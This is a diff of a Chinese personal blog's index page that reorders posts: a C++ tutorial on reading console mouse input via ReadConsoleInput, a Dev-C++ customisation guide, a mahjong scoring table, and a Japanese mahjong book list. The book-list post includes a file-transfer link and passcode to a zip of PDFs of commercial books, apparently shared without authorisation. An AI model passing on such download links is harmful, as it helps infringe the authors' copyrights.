@@ -93,20 +93,6 @@
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2024/07/14/高中学习心得/">
-				高中学习心得
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-07-14
-		</div>
-		
-		This page has been hidden. :>
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
 			<a href="/2023/11/19/科学上网/">
 				科学上网
 			</a>
@@ -150,175 +136,6 @@
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2023/07/07/用C-读取鼠标在控制台上的操作/">
-				用C++读取鼠标在控制台上的操作
-			</a>
-		</h1>
-		<div class="postInfo">
-			2023-07-07
-		</div>
-		
-		<p>与读取键盘信息类似，读取鼠标信息也是通过 <code>ReadConsoleInput</code> 函数来实现</p>
-<p>咱先说一下需要用到的头文件：</p>
-<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span></code></pre>
-
-<p>响应鼠标点击事件的变量类型</p>
-<pre><code class="hljs cpp">INPUT_RECORD</code></pre>
-
-
-<p>咱先介绍一下<code>ReadConsoleInput</code>这个函数</p>
-<pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_MOUSE_EVENT_RECORD</span> &#123; 
-		COORD dwMousePosition;		<span class="hljs-comment">// 当前鼠标位置</span>
-		DWORD dwButtonState;		<span class="hljs-comment">// 鼠标按钮状态</span>
-		DWORD dwControlKeyState;	<span class="hljs-comment">// 键盘控制键状态</span>
-		DWORD dwEventFlags; 		<span class="hljs-comment">// 事件状态</span>
-&#125; MOUSE_EVENT_RECORD;
-<span class="hljs-comment">//这个东西一般都在&quot;INPUT_RECORD的变量名.Event.MouseEvent.以上变量&quot;</span></code></pre>
-<p>1.第一个参数存放鼠标的位置信息，类型为 COORD 坐标类型；</p>
-<p>2.第二个参数（dwButtonState）为鼠标的按键状态，包含的值如下:</p>
-<table>
-<thead>
-<tr>
-<th align="left">鼠标按键状态码（dwButtonState）</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">FROM_LEFT_1ST_BUTTON_PRESSED</td>
-<td align="left">最左边按键</td>
-</tr>
-<tr>
-<td align="left">FROM_LEFT_2ND_BUTTON_PRESSED</td>
-<td align="left">左起第二个按键</td>
-</tr>
-<tr>
-<td align="left">FROM_LEFT_3RD_BUTTON_PRESSED</td>
-<td align="left">左起第三个按键</td>
-</tr>
-<tr>
-<td align="left">FROM_LEFT_4TH_BUTTON_PRESSED</td>
-<td align="left">左起第四个按键</td>
-</tr>
-<tr>
-<td align="left">RIGHTMOST_BUTTON_PRESSED</td>
-<td align="left">最右边按键</td>
-</tr>
-</tbody></table>
-<p>3.第三个参数是键盘控制键状态，这个和上一章的内容是一样的；</p>
-<p>4.最后一个参数（dwEventFlag）为事件状态：</p>
-<table>
-<thead>
-<tr>
-<th align="left">事件状态码（dwEventFlag）</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">DOUBLE_CLICK</td>
-<td align="left">双击</td>
-</tr>
-<tr>
-<td align="left">MOUSE_MOVED</td>
-<td align="left">移动</td>
-</tr>
-<tr>
-<td align="left">MOUSE_WHEELED</td>
-<td align="left">滚轮滚动（只适用于Windows 2000&#x2F;XP）</td>
-</tr>
-</tbody></table>
-<p>在程序开头应加上</p>
-<pre><code class="hljs cpp">HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
-HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
-<span class="hljs-comment">//这是用来添加鼠标输入设备的</span></code></pre>
-
-<p>用法举例</p>
-<pre><code class="hljs cpp"><span class="hljs-comment">//我写的一个简单地例子</span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span>
-<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
-<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
-<span class="hljs-function"></span>&#123;
-	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
-	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
-
-	CONSOLE_SCREEN_BUFFER_INFO bInfo;
-	INPUT_RECORD mouseRec;
-	DWORD res;
-
-	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)
-	&#123;
-		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);<span class="hljs-comment">//读取一个鼠标操作</span>
-		<span class="hljs-keyword">if</span>(mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)<span class="hljs-comment">//如果点击了左键</span>
-		&#123;
-			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)<span class="hljs-comment">//如果是双击</span>
-			&#123;
-				<span class="hljs-keyword">break</span>;	<span class="hljs-comment">//退出循环</span>
-			&#125;
-			<span class="hljs-keyword">else</span><span class="hljs-comment">//单击的情况</span>
-			&#123;
-				cout&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.X&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.Y&lt;&lt;endl;<span class="hljs-comment">//输出当前鼠标的位置</span>
-			&#125;
-		&#125;
-	&#125;
-	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
-	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
-&#125;</code></pre>
-<p>摘自网络</p>
-<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span>  </span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
- 
-<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  </span>
-<span class="hljs-function"></span>&#123;  
-	<span class="hljs-comment">// 获取标准输入输出设备句柄  </span>
-	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);        
-	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE); 
-	CONSOLE_SCREEN_BUFFER_INFO bInfo;
-	INPUT_RECORD	mouseRec;
-	DWORD			res;
-	COORD			crPos, crHome = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu\n&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);	<span class="hljs-comment">// 初始状态</span>
-	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
-	&#123;
-		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);
- 
-		<span class="hljs-keyword">if</span> (mouseRec.EventType == MOUSE_EVENT)
-		&#123;
-			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)
-			&#123;
-				<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)
-				&#123;
-					<span class="hljs-keyword">break</span>;	<span class="hljs-comment">// 左键双击 退出循环</span>
-				&#125;
-			&#125;			
-			crPos = mouseRec.Event.MouseEvent.dwMousePosition;
-			<span class="hljs-built_in">GetConsoleScreenBufferInfo</span>(hOut, &amp;bInfo);
-			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, crHome);
-			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu&quot;</span>, crPos.X, crPos.Y);
-			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, bInfo.dwCursorPosition);
-			<span class="hljs-keyword">switch</span> (mouseRec.Event.MouseEvent.dwButtonState)
-			&#123;
-				<span class="hljs-keyword">case</span> FROM_LEFT_1ST_BUTTON_PRESSED:			<span class="hljs-comment">// 左键 输出A</span>
-					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
-					<span class="hljs-keyword">break</span>;		<span class="hljs-comment">// 如果使用printf输出，则之前需要先设置光标的位置</span>
- 	
-				<span class="hljs-keyword">case</span> RIGHTMOST_BUTTON_PRESSED:				<span class="hljs-comment">// 右键 输出a</span>
-					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
-					<span class="hljs-keyword">break</span>;
-	 
-				<span class="hljs-keyword">default</span>:
-					<span class="hljs-keyword">break</span>;
-			&#125;
-		&#125;		
-	&#125;
-	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
-	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
-	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
-&#125;</code></pre>
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
 			<a href="/2024/07/25/日语学习资源/">
 				日语学习资源
 			</a>
@@ -328,257 +145,6 @@ HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
 		</div>
 		
 		<p><a target="_blank" rel="noopener" href="https://mainichi-nonbiri.com/">毎日のんびり日本語教師</a><br><a target="_blank" rel="noopener" href="https://www.weblio.jp/">Weblio辞書国語辞典</a></p>
-
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2023/07/06/日本麻将资料整理/">
-				日本麻将资料整理
-			</a>
-		</h1>
-		<div class="postInfo">
-			2023-07-06
-		</div>
-		
-		<p><strong>书名一览（为保证浏览体验，请关闭翻译）</strong></p>
-<blockquote>
-<p>《ASAPIN 天才雀士に麻雀のことを聞いたらバカ勝ちできた》<br>《Guzaku 傑作「何切る」300選》<br>《Guzaku 定石「何切る」301選》<br>《owata 三人麻雀の極意》<br>《ZERO ゼロ秒思考の麻雀》<br>《ZERO 麻雀強者の0秒思考》<br>《かにマジン 日本一麻雀が強いサラリーマンの必勝法》<br>《きよ アマチュア地方最強位が作る新麻雀マニュアル》<br>《みーにん 「統計学」のマージャン戦術》<br>《みーにん 知るだけで強くなる麻雀の2択》<br>《ゆうせー 実戦でよく出る!麻雀講義》<br>《中島準也 理論的思考で勝つ麻雀》<br>《二階堂亜樹 勝てる麻雀の基本》<br>《土井泰昭 勝つ人は知っている現代麻雀30の新常識》<br>《土田浩翔 運を育てる》<br>《堀内正人 麻雀の麒麟児の一打》<br>《堀慎吾 麻雀だから君は負けるんです》<br>《多井隆晴 多井熱》<br>《小林剛 スーパーデジタル麻雀》<br>《川村晃裕 麻雀勝ち組の鳴きテクニック》<br>《平澤元気 よくわかる麻雀の勝ち方》<br>《平澤元気 現代麻雀の秘技相手に対応させる技術》<br>《平澤元気 絶対にラスを引かない麻雀ラス回避35の技術》<br>《日本プロ麻雀連盟 麻雀基本手筋コレクション》<br>《朝倉康心 麻雀の失敗学》<br>《比嘉秀仁 強者の最近手筋100》<br>《水上直紀 麻雀AI戦術》<br>《独歩 序盤の鉄戦略》<br>《独歩 鉄押しの条件》<br>《石橋伸洋 進化するデジタル麻雀》<br>《石橋伸洋 黒いデジタル麻雀》<br>《福地誠 これだけで勝てる!麻雀の基本形80》<br>《福地誠 手作りと押し引きの鉄戦術》<br>《福地誠 麻雀10倍勝てるテクニック》<br>《福地誠 麻雀の正解》<br>《福地誠 麻雀テクニック》<br>《福地誠 麻雀勝ち組の選択》<br>《福地誠 麻雀勝ち組の選択II》<br>《菊池翔 絶対に負けない最強麻雀戦術》<br>《藤田晋 仕事が麻雀で麻雀が仕事》<br>《近代麻雀 プロに挑戦!!麻雀検定》<br>《近代麻雀 麻雀プロMリーグ選手名鑑》<br>《近藤誠一 大きく打ち大きく勝つ麻雀》<br>《鈴木たろう ゼウスの選択》<br>《馬場裕一 バビーのメンチン何切る》<br>《鳳南研究所 現代麻雀の神ワザ》</p>
-</blockquote>
-<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><strong>资料来源于网络</strong></p>
-<p><strong>仅供交流学习使用，不得用于任何商业用途</strong></p>
-<p><a target="_blank" rel="noopener" href="https://cowtransfer.com/s/cc797d6a256440">https://cowtransfer.com/s/cc797d6a256440</a> 点击链接查看 【 PDF.zip 】 ，或访问奶牛快传 cowtransfer.com 输入传输口令 f4jzju 查看；</p>
-
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2024/10/31/将DEV-C-编辑器打造成神级IDE及美化/">
-				将DEV-C++编辑器打造成神级IDE及美化
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-10-31
-		</div>
-		
-		<h1 id="头记"><a href="#头记" class="headerlink" title="头记"></a>头记</h1><p>鉴于使用<code>原版DEV-C++</code>不得不说十分滞后，人家<code>Visual Studio</code>多高端，本人写下此文章,使用一些奇技淫巧，美化和增强此IDE，个人认为可以和<code>Visual Studio</code>相媲美</p>
-<h1 id="样式美化"><a href="#样式美化" class="headerlink" title="样式美化"></a>样式美化</h1><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/vttuwku5.png" alt="预览"></p>
-<ol>
-<li><p>点击顶部菜单栏<code>工具</code></p>
-</li>
-<li><p>点击下拉列表中的<code>编译器选项</code></p>
-</li>
-<li><p>点击新弹出的窗口中的<code>基本</code></p>
-</li>
-<li><p>取消勾选<code>高亮显示当前行</code>，或者后面你再选择你喜欢的颜色。</p>
-</li>
-<li><p>点击还是这个窗口中的<code>语法</code>（和“基本”在同一排）</p>
-</li>
-<li><p>选择<code>预设</code>为 Obsidian，保存一下再进行以下修改</p>
-</li>
-<li><p>修改以下几个地方：（都只改前景和样式，背景不改，改完记得点确定）</p>
-</li>
-</ol>
-<blockquote>
-<p>Preprocessor: （自定义）红136+绿99+蓝173+下划线</p>
-<p>Reserved Word： （自定义）红106+绿185+蓝255+下划线</p>
-<p>Identifier： Silver</p>
-<p>String：（自定义）红255+绿128+蓝128</p>
-<p>Symbol：（自定义）同上String</p>
-</blockquote>
-<h1 id="取消完成符号（个人喜好）"><a href="#取消完成符号（个人喜好）" class="headerlink" title="取消完成符号（个人喜好）"></a>取消完成符号（个人喜好）</h1><ol>
-<li><p>点击顶部菜单栏<code>工具</code>-&gt;点击<code>编译器选项</code></p>
-</li>
-<li><p>点击新弹出的窗口中的<code>代码补全</code></p>
-</li>
-<li><p>点击<code>完成符号</code></p>
-</li>
-<li><p>取消勾选<code>启用符号配对</code></p>
-</li>
-</ol>
-<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/1ijwn1cy.png"></p>
-<h1 id="编译选项优化"><a href="#编译选项优化" class="headerlink" title="编译选项优化"></a>编译选项优化</h1><ol>
-<li><p>点击顶部菜单栏<code>工具</code></p>
-</li>
-<li><p>点击下拉列表中的<code>编译选项</code></p>
-</li>
-<li><p>点击新弹出的窗口中的<code>代码生成/优化</code></p>
-</li>
-<li><p>点击<code>代码警告</code></p>
-</li>
-<li><p>设<code>显示最多警告信息（-Wall）</code>为Yes</p>
-</li>
-<li><p>(有必要的可以设“显示所有警告为错误（-Werror）”为Yes)</p>
-</li>
-</ol>
-<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/mf2j4j60.png" alt="像这样"></p>
-<h1 id="使用自己的mingw-w64"><a href="#使用自己的mingw-w64" class="headerlink" title="使用自己的mingw-w64"></a>使用自己的mingw-w64</h1><p>（Dev-C++ 5.11自带的mingw-w64的版本才4.9.2，我们可以使用自己最新版的mingw-w64，目前是8.1.0）</p>
-<ol>
-<li><p>mingw-w64的下载安装教程,在<a target="_blank" rel="noopener" href="https://www.luogu.com.cn/blog/sky-fox/post-an-li-sublime-text-3-pei-zhi-cjava-kai-fa-huan-jing">这里</a>有</p>
-</li>
-<li><p>打开Dev-C++过程中一定不要关闭</p>
-</li>
-<li><p>打开你Dev-C++安装的位置（默认在C:\Program Files (x86)\Dev-Cpp）</p>
-</li>
-<li><p>用你的MinGW64覆盖掉自带的MinGW64的文件夹</p>
-</li>
-<li><p>然后点击Dev-C++菜单栏 <code>文件</code> -&gt; <code> 编译选项</code> -&gt; 点击 <code>目录</code></p>
-</li>
-<li><p>点击<code>C包含文件</code>和<code>C++包含文件</code></p>
-</li>
-<li><p>把里面路径所有的4.9.2换成8.1.0（即你所用的版本）</p>
-</li>
-<li><p>然后重新打开Dev-C++进行配置</p>
-</li>
-</ol>
-<p>修改样例（修改后点击替换）:</p>
-<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/9ms6hwzz.png"></p>
-<p><strong>注</strong>：如果你过程中关闭了Dev-C++重新打开时他会提示你“<strong>路径无效，是否删除无效路径</strong>”请选择<strong>否</strong>，不然你的许多头文件会用不了</p>
-<p>接下来配置一下</p>
-<ul>
-<li><p>点击Dev-C++菜单栏 <code>文件</code> -&gt; <code>编译选项</code> 点击上方两个加号处</p>
-</li>
-<li><p>点击Yes或No，点击Yes就会清空原有列表，点击No就会保留原来列表，建议清空（建议点击Yes）</p>
-</li>
-<li><p>如果会生成一个新列表，说明配置成功了,像这样</p>
-</li>
-</ul>
-<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/5eebhg9a.png"><br><img src="https://cdn.luogu.com.cn/upload/image_hosting/vdtluh48.png"></p>
-<h1 id="格式化修改"><a href="#格式化修改" class="headerlink" title="格式化修改"></a>格式化修改</h1><ol>
-<li><p>点击顶部菜单栏<code>AStyle</code></p>
-</li>
-<li><p>点击下拉列表中的<code>格式化选项</code></p>
-</li>
-<li><p>选择<code>选项——括号风格</code>为Allman（个人喜欢）（默认的Java也还行）</p>
-</li>
-<li><p>在编辑代码的时候按Ctrl+Shift+A就可以自动格式化啦</p>
-</li>
-</ol>
-<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/o8x9q60g.png" alt="预览"></p>
-<h1 id="设置透明编辑器"><a href="#设置透明编辑器" class="headerlink" title="设置透明编辑器"></a>设置透明编辑器</h1><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/9ztt3tra.png" alt="预览"></p>
-<ol>
-<li><p>点击<a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/fox-nest/Glass2k.rar">这里</a>下载<a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/fox-nest/Glass2k.rar">Glass2k程序</a></p>
-</li>
-<li><p>解压并打开<code>Glass2k.exe</code>(怎么都是英文的？！别怕)</p>
-</li>
-<li><p>如果没有显示界面那就看看任务栏右下角有没有三个箱子堆起来的图标，右键点<code>Settings</code></p>
-</li>
-<li><p>有三个勾选框，简单翻译一下，第一个是开机启动，第二个是记住透明度设置，第三个是深度使用该软件（建议勾选第二和第三个）（下面那个蓝蓝的条是用来设置任务栏的透明度的）</p>
-</li>
-<li><p>接下来为了避免鼠标按键冲突，设置<code>Right Click</code>: <code>+ Ctrl + Shift</code></p>
-</li>
-<li><p>然后打开DEV-C++，按着<code>Ctrl + Shift + 右键</code>点击DEV-C++窗口的任意地方，就会出现一个列表，选择你想要的透明度就可以啦（建议设置80%）</p>
-</li>
-</ol>
-<ul>
-<li>可以按照下图修改</li>
-</ul>
-<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/0gbn318e.png" alt="预览"></p>
-<p>（PS:这个软件也可以用在其他一些地方哦，如：浏览器，文件夹等）</p>
-<h1 id="一些快捷键"><a href="#一些快捷键" class="headerlink" title="一些快捷键"></a>一些快捷键</h1><ol>
-<li><p>f9编译，f10运行，f11编译运行（这个应该不用我多说）</p>
-</li>
-<li><p>f5调试（记得把设定编译器配置改为TDM-GCC 4.9.2 64-bit Debug），F7下一步，F8单步进入（这个应该也不用我多说）</p>
-</li>
-<li><p>Ctrl+f11全屏&#x2F;取消全屏，样例：<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/xv7z3idp.png"></p>
-</li>
-<li><p>当你打开了两个文件时，让你的页面停留在一个文件，按Ctrl+M就可以把另一个文件在新的页面打开，样例:<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/klowtiln.png"></p>
-</li>
-</ol>
-<h1 id="最后的一些话"><a href="#最后的一些话" class="headerlink" title="最后的一些话"></a>最后的一些话</h1><p>Dev-C++跟目前的主流代码编辑器相比已被拉开巨大的差距，但</p>
-<p><strong>文章到此就结束了，还在持续更新，给个赞再走呗</strong></p>
-
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2024/02/08/日本麻将算符表/">
-				日本麻将算符表
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-02-08
-		</div>
-		
-		<blockquote>
-<p>符&#x3D;20（基底符）+各牌组的符数+和牌方式<br>个位不为0的用进一法进到十位</p>
-</blockquote>
-<h2 id="牌组的符数"><a href="#牌组的符数" class="headerlink" title="牌组的符数"></a>牌组的符数</h2><table>
-<thead>
-<tr>
-<th align="center">刻子</th>
-<th align="center">暗</th>
-<th align="center">幺九</th>
-<th align="center">杠</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">2</td>
-<td align="center">(累乘)*2</td>
-<td align="center">(累乘)*2</td>
-<td align="center">(累乘)*4</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="center">雀头</th>
-<th align="center">顺子</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">2*番数</td>
-<td align="center">0</td>
-</tr>
-</tbody></table>
-<h2 id="和牌方式"><a href="#和牌方式" class="headerlink" title="和牌方式"></a>和牌方式</h2><table>
-<thead>
-<tr>
-<th align="center">门清前放铳</th>
-<th align="center">自摸</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">10</td>
-<td align="center">2</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="center">平和自摸</th>
-<th align="center">平和放铳</th>
-<th align="center">特殊牌型</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">20（固定）</td>
-<td align="center">30（固定）</td>
-<td align="center">25（固定）</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="center">边张（单骑）</th>
-<th align="center">嵌张（单骑）</th>
-<th align="center">雀头（单骑）</th>
-<th align="center">双碰（非单骑）</th>
-<th align="center">两面（非单骑）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">2</td>
-<td align="center">2</td>
-<td align="center">2</td>
-<td align="center">0</td>
-<td align="center">0</td>
-</tr>
-</tbody></table>
-<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><a target="_blank" rel="noopener" href="https://lietxia.github.io/fupractice.html">https://lietxia.github.io/fupractice.html</a></p>
 
 		
 	</div>
@@ -1938,6 +1504,350 @@ HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
+			<a href="/2024/07/14/高中学习心得/">
+				高中学习心得
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-07-14
+		</div>
+		
+		This page has been hidden. :>
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2023/07/07/用C-读取鼠标在控制台上的操作/">
+				用C++读取鼠标在控制台上的操作
+			</a>
+		</h1>
+		<div class="postInfo">
+			2023-07-07
+		</div>
+		
+		<p>与读取键盘信息类似，读取鼠标信息也是通过 <code>ReadConsoleInput</code> 函数来实现</p>
+<p>咱先说一下需要用到的头文件：</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span></code></pre>
+
+<p>响应鼠标点击事件的变量类型</p>
+<pre><code class="hljs cpp">INPUT_RECORD</code></pre>
+
+
+<p>咱先介绍一下<code>ReadConsoleInput</code>这个函数</p>
+<pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_MOUSE_EVENT_RECORD</span> &#123; 
+		COORD dwMousePosition;		<span class="hljs-comment">// 当前鼠标位置</span>
+		DWORD dwButtonState;		<span class="hljs-comment">// 鼠标按钮状态</span>
+		DWORD dwControlKeyState;	<span class="hljs-comment">// 键盘控制键状态</span>
+		DWORD dwEventFlags; 		<span class="hljs-comment">// 事件状态</span>
+&#125; MOUSE_EVENT_RECORD;
+<span class="hljs-comment">//这个东西一般都在&quot;INPUT_RECORD的变量名.Event.MouseEvent.以上变量&quot;</span></code></pre>
+<p>1.第一个参数存放鼠标的位置信息，类型为 COORD 坐标类型；</p>
+<p>2.第二个参数（dwButtonState）为鼠标的按键状态，包含的值如下:</p>
+<table>
+<thead>
+<tr>
+<th align="left">鼠标按键状态码（dwButtonState）</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">FROM_LEFT_1ST_BUTTON_PRESSED</td>
+<td align="left">最左边按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_2ND_BUTTON_PRESSED</td>
+<td align="left">左起第二个按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_3RD_BUTTON_PRESSED</td>
+<td align="left">左起第三个按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_4TH_BUTTON_PRESSED</td>
+<td align="left">左起第四个按键</td>
+</tr>
+<tr>
+<td align="left">RIGHTMOST_BUTTON_PRESSED</td>
+<td align="left">最右边按键</td>
+</tr>
+</tbody></table>
+<p>3.第三个参数是键盘控制键状态，这个和上一章的内容是一样的；</p>
+<p>4.最后一个参数（dwEventFlag）为事件状态：</p>
+<table>
+<thead>
+<tr>
+<th align="left">事件状态码（dwEventFlag）</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DOUBLE_CLICK</td>
+<td align="left">双击</td>
+</tr>
+<tr>
+<td align="left">MOUSE_MOVED</td>
+<td align="left">移动</td>
+</tr>
+<tr>
+<td align="left">MOUSE_WHEELED</td>
+<td align="left">滚轮滚动（只适用于Windows 2000&#x2F;XP）</td>
+</tr>
+</tbody></table>
+<p>在程序开头应加上</p>
+<pre><code class="hljs cpp">HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
+<span class="hljs-comment">//这是用来添加鼠标输入设备的</span></code></pre>
+
+<p>用法举例</p>
+<pre><code class="hljs cpp"><span class="hljs-comment">//我写的一个简单地例子</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
+
+	CONSOLE_SCREEN_BUFFER_INFO bInfo;
+	INPUT_RECORD mouseRec;
+	DWORD res;
+
+	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)
+	&#123;
+		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);<span class="hljs-comment">//读取一个鼠标操作</span>
+		<span class="hljs-keyword">if</span>(mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)<span class="hljs-comment">//如果点击了左键</span>
+		&#123;
+			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)<span class="hljs-comment">//如果是双击</span>
+			&#123;
+				<span class="hljs-keyword">break</span>;	<span class="hljs-comment">//退出循环</span>
+			&#125;
+			<span class="hljs-keyword">else</span><span class="hljs-comment">//单击的情况</span>
+			&#123;
+				cout&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.X&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.Y&lt;&lt;endl;<span class="hljs-comment">//输出当前鼠标的位置</span>
+			&#125;
+		&#125;
+	&#125;
+	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
+	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
+&#125;</code></pre>
+<p>摘自网络</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span>  </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
+ 
